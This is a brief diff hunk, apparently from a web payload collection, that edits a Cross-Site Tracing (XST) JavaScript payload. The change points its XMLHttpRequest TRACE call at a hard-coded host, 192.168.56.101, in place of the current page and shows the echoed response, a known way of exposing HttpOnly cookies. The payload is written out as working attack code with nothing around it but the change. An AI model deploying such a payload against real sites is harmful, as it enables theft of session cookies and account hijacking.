@@ -24,7 +24,7 @@ httponly_XST Payload =>2
 <script type="text/javascript"> 
 function sendTrace () {    
 var xmlHttp = new XMLHttpRequest();    
-xmlHttp.open("TRACE", window.location);    
+xmlHttp.open("TRACE", "http://192.168.56.101/");    
 xmlHttp.send();    
 xmlDoc=xmlHttp.responseText;    
 alert(xmlDoc); } 
